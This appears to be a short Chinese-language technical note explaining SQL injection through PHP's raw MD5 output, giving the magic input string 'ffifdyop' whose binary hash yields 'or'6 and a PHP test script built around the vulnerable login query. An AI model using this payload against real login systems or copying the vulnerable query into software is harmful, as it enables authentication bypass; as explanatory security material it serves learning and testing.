##SQL injection with raw MD5 hashes

</br>
今天看到 <code>$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";</code>  
这样的一个sql，是可以注入的

思路是这样的，当md5后的hex转换成字符串后，  
如果包含 'or'<trash> 这样的字符串，那整个sql变成  
<code>SELECT * FROM admin WHERE pass = ''or'6<trash\>'</code>  
很明显可以注入了。

难点就在如何寻找这样的字符串，我只是顺手牵羊，牵了一个。。  
提供一个字符串：ffifdyop  
md5后，<code>276f722736c95d99e921722cf9ed621c</code>  
再转成字符串： 'or'6<trash\>

---
>测试代码：

	<?php
		error_reporting(0);
		$link = mysql_connect('localhost', 'root', '');
		if (!$link) {   
		die('Could not connect to MySQL: ' . mysql_error());   
		}  
		// 选择数据库  
		$db = mysql_select_db("test", $link);  
		if(!$db)  
		{  
		  echo 'select db error';  
		  exit();  
		}  
		// 执行sql  
		$password = "ffifdyop";  
		$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";  
		var_dump($sql);  
		$result=mysql_query($sql) or die('<pre>' . mysql_error() . '</pre>' );  
		$row1 = mysql_fetch_row($result);  
		var_dump($row1);  
		mysql_close($link);
	?>

4/20/2016 8:38:02 PM 